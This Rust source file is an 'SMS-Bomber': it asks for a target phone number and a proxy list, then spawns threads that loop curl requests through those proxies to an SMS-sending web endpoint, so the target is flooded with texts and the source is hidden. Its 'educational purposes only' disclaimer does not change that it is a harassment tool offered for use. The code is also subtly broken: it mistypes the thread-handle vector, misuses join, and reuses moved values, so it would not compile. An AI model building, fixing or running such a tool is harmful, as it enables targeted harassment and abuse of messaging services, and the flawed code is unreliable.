// This will be a small program to SMS-bomb a target while
// using proxies to obfusticate where they are coming from.
// This is for educational purposes only. I am not responsible
// for any actions done with this code.

use std::io::{self, Read, Write};
use std::process::Command;
use std::thread::{self, Thread};
use std::time::Duration;

fn main() {
    println!("SMS-Bomber v1.0.0");
    println!("This code is for educational purposes only. I am not responsible for any actions done with this code.");
    println!("");

    let mut phone_number = String::new();
    let mut proxy_file = String::new();
    let mut threads = String::new();
    let mut time = String::new();

    print!("Phone Number: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut phone_number).unwrap();
    let phone_number = phone_number.trim();

    print!("Proxy File: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut proxy_file).unwrap();
    let proxy_file = proxy_file.trim();

    print!("Threads: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut threads).unwrap();
    let threads = threads.trim().parse::<u32>().unwrap();

    print!("Time: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut time).unwrap();
    let time = time.trim().parse::<u64>().unwrap();

    let mut proxies: Vec<String> = Vec::new();
    let mut file = std::fs::File::open(proxy_file).unwrap();
    let mut contents = String::new();
    file.read_to_string(&mut contents).unwrap();
    for line in contents.lines() {
        proxies.push(line.to_string());
    }

    let mut children: Vec<Vec<char>> = Vec::new();
    let mut counter = 0;
    for proxy in proxies {
        if counter == threads {
            for child in children {
                child.join(self).unwrap();
            }
            children.clear();
            counter = 0;
        }
        counter += 1;
        let child = thread::spawn(move || {
            let mut cmd = Command::new("curl");
            cmd.arg("--proxy").arg(proxy);
            cmd.arg(format!(
                "https://textbelt.com/text?phone={}&message=Hello%20World",
                phone_number
            ));
            loop {
                cmd.output().unwrap();
                thread::sleep(Duration::from_millis(100));
            }
        });
        children.push(child);
    }

    loop {
        thread::sleep(Duration::from_millis(1000 * time));
        for child in children {
            child.join().unwrap();
        }
        children.clear();
        counter = 0;
        for proxy in proxies {
            if counter == threads {
                for child in children {
                    child.join().unwrap();
                }
                children.clear();
                counter = 0;
            }
            counter += 1;
            let child = thread::spawn(move || {
                let mut cmd = Command::new("curl");
                cmd.arg("--proxy").arg(proxy);
                cmd.arg(format!(
                    "https://textbelt.com/text?phone={}&message=Hello%20World",
                    phone_number
                ));
                loop {
                    cmd.output().unwrap();
                    thread::sleep(Duration::from_millis(100));
                }
            });
            children.push(child);
        }
    }
}
